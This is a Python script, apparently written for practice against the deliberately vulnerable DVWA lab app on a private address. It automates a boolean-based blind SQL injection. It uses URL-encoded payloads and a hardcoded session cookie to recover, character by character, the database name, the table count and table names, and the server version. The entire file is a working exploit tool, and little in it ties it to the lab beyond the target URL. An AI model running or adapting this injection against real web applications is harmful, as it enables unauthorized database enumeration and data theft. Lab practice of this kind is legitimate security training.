from pwn import *
import requests
import re
from itertools import cycle
import logging

url = 'http://192.168.56.1/dvwa/vulnerabilities/sqli_blind'
fixed_query = "?Submit=Submit&id=1"
cookies = {
    'security': 'low',
    'PHPSESSID': '39fj0sb2ct9009dhcsl8bp7pa8'
}
context.log_level = 'debug'


def sql_inject(sqli_pt1, variable, sqli_pt2):
    # Build up URL and execute SQLi
    next_url = url + fixed_query + sqli_pt1 + variable + sqli_pt2
    debug("Testing " + variable + " on \"" + next_url + "\"")
    return requests.get(next_url, cookies=cookies)


def guess_len(guess_type, sqli_pt1, sqli_pt2):
    for i in range(1, 100):
        response = sql_inject(sqli_pt1, str(i), sqli_pt2)
        error_message = re.search(r'User.*\.', response.text).group(0)
        debug(error_message)
        if "MISSING" not in error_message:
            success(guess_type + str(i) + '\n\n')
            return i

#db_name = guess_name("DB Name: ", "'+and+ascii(substr(database(),", "+%23", db_name_len, ord('a'), ord('z'))
def guess_name(guess_type, sqli_pt1, sqli_pt2, name_len, min_char_initial, max_char_initial):
    name = ""
    for i in range(1, name_len + 1):
        found_next_char = 0
        min_char = min_char_initial
        max_char = max_char_initial
        current_char = int((min_char + max_char) / 2)
        comparison_types = cycle(['<', '>'])
        comparison = next(comparison_types)

        while(found_next_char != 2):
            
            response = sql_inject(sqli_pt1 + str(i) + "," + str(i) + "))" + comparison, str(current_char), sqli_pt2)
            
            error_message = re.search(r'User.*\.', response.text).group(0)
            debug(error_message)

            
            if "MISSING" not in error_message:
                found_next_char = 0
                if comparison == '>':
                    min_char = current_char
                else:
                    max_char = current_char
                current_char = int((min_char + max_char) / 2)
            else:
                comparison = next(comparison_types)
                found_next_char += 1
        name += chr(current_char)
        info("Found char(" + str(i) + "): " + chr(current_char))
    success(guess_type + name + '\n\n')
    return name

def error_func():
	db_name_len = guess_len("DB Name Length: ", "'+and+length(database())+=", "+%23")
	db_name = guess_name("DB Name: ", "'+and+ascii(substr(database(),", "+%23", db_name_len, ord('a'), ord('z'))
	db_table_count = guess_len(
    	"DB Table Count: ",
    	"'+and+(select+count(*)+from+information_schema.tables+where+table_schema=database())+=", "+%23")

	for table_no in range(db_table_count):
		table_name_len = guess_len(
			"Table Name Length: ",
			"'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),1))+=",
			"+%23")
		table_name = guess_name(
			"Table Name: ",
			"'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1+offset+" + str(table_no) + "),",
			"+%23",
			table_name_len, ord('a'), ord('z'))
        
		

	db_version_name_len = guess_len("DB Version Length: ", "'+and+length(@@version)+=", "+%23")
	db_version_name = guess_name("DB Version: ", "'+and+ascii(substr(@@version,", "+%23", db_version_name_len, ord(' '), ord('z'))